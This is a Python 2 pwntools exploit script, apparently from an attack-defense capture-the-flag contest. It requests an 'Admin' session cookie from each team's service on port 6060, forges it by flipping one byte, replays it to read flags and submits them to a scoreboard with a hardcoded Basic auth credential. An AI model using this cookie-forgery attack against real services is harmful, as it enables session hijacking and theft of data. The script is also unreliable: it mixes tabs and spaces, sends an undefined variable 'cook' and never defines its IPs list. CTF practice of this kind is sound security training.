from pwn import *
from time import sleep
from Submit import submit
import requests
import json

def submit(flag):
	url = "http://10.115.0.2:8000/flag"
	data = json.dumps({"flag": flag})
	# if the team name is bi0s and password is bi0s - you need base64 of "bi0s:bi0s"
	header = {"Authorization": "Basic YmkwczpiaTBz"}
	r = requests.post(url, data=data, headers=header)
	print r.text 
	return
def Exploit(ip):
	print(ip)
	conn = remote(ip,6060);sleep(0.1)
	a = conn.recv()
  if "Enter your choice" not in a: print("Connection Problem %s"%ip)
	conn.sendline('1');sleep(0.1)
  a = conn.recv()
  if "Enter username" not in a: print("Connection Problem %s"%ip)
	conn.sendline('Admin');sleep(0.1)
	cookie = conn.recv();conn.close()
	cookie = cookie.split(':')[1].strip(' ').strip('\n')
	cookie = cookie[4:].decode('hex')
	cookie = cookie[:9]+chr(ord(cookie[9] )^32)+cookie[10:]
	cookie = cookie.encode('hex')
	conn = remote(ip,6060);sleep(0.1)
	a = conn.recv()
  if "Enter your choice" not in a: print("Connection Problem %s"%ip)
	conn.sendline('2');sleep(0.1)
	a = conn.recv()
  if "Enter your cookie" not in a: print("Connection Problem %s"%ip)
	conn.sendline(cook);sleep(0.1)
	a = conn.recv();conn.close();
	a = [x.strip('\n').strip(' ') for x in a.split('\n')]
	for i in a:
			if i[:3] == 'FLG':
					submit(i)
					print(i)
def start():
	global IPs
	for ip in IPs:
		try:
			Exploit(ip)
		except:
			print("Error with the ip addr :: "+ip)
def main():
  start()
  sleep(60) # Sleep for 60 sec which means it runs 3 times for 1 tick , it's not a problem at all.
main()
